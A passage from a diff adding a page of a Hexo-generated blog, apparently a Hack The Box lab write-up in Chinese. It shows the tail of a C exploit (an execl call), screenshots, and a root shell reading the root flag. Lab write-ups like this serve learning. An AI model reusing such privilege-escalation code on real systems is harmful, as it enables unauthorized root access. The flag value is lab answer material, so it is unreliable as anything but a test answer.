<span class="literal">NULL</span>);</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;execl %s&quot;</span>, BIN_UPPER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译后运行</p>
+<p><img src="/../images/image-20231121234327681.png" alt="image-20231121234327681"></p>
+<p><img src="/../images/image-20231121234418056.png" alt="image-20231121234418056"></p>
+<p>root flag :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1<span class="comment"># cat root.txt</span></span><br><span class="line">171bf3678d4c4fd644256369aa3512d8</span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/11/25/HTB-Zipping/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/11/20/HTB-Codify/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-11-21 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Machines/">Machines<span>6</span></a></li> <li><a href="/categories/Machines/Lab/">Lab<span>6</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/HTB/">HTB<span>8</span></a></li> <li><a href="/tags/easy/">easy<span>6</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 Lavande's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
